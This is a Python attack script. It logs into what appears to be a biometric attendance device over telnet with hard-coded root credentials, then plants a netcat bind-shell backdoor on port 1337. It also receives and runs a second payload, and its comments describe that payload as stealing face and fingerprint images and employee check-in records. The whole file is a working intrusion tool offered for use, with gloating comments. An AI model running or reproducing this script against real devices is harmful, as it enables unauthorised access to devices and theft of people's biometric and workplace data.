import os,re,telnetlib

h = "192.168.45.206"


def TEL(h):

    s = telnetlib.Telnet(h)

    print(s.read_until(b'login: ').decode())
    s.write(b'root\n')
    print(s.read_until(b'Password: ').decode())
    s.write(b'solokey\n')
    print(s.read_until(b'Processing /etc/profile... Done').decode())

    s.write(bytes('pwd\r\n', 'utf-8'))
    print(s.read_until(b'root').decode())
    print(" we are in the root directory")

    s.write(bytes('cd /mnt/mtdblock/data/\r\n', 'utf-8'))  # send data
    s.write(bytes('pwd\r', 'utf-8'))                       # same
    print(s.read_until(b'mnt').decode()) 		   # until result
    print(" *---- Data Directory ----*")		   # result after this, wtf illogic :/ ?

    s.write(bytes('ls -la\r\n', 'utf-8'))
    print(s.read_until(b'.').decode())

    print(" ---- Ok fine ?")

########## You love Backd00rS ? let's make one :D ##########

    s.write(bytes('mkdir /tmp/fuck\r\n', 'utf-8'))
    s.write(bytes('cd /tmp/fuck\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    s.write(bytes('ls -la\r\n', 'utf-8'))
    print(s.read_until(b'.').decode())
    s.write(bytes('ls -la\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    s.write(bytes('echo "nc -l -p 1337 -e /bin/sh">9ys\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    s.write(bytes('chmod +x 9ys\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    print(s.read_until(b'#').decode())

    print(" ---- Hummm Backdoor waiting for u....")
    print(" ----  Im Using Windows so : type hell | nc HOST P0RT !")
    print(" ----   Wait 10sec , Then press CTRL+C to stop file transfer...")
    s.write(bytes('nc -l -p 1337 >hell\r\n', 'utf-8'))  #### don't forget this , using : (type or cat) seconde_backdoor | nc TARGETIP 1337
    # the seconde_backdoor is an automated script (that i w'll not share it lol ) used to steal every face picture, fingerprint picture
    # and even leak every new checkin and checkout employe ( database file ) , or no wait i will just share a simple second_backdoor file :p.    
    print(s.read_until(b'#').decode())

    s.write(bytes('./9ys &>/dev/null &\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    s.write(bytes('chmod +x hell\r\n', 'utf-8'))
    print(s.read_until(b'#').decode())
    print(" ---> [+] Reverse Shell Backdoor....")
    print(" ---->   Backdoor Executed :s")

############### ..... u can do something better #################

TEL(h)
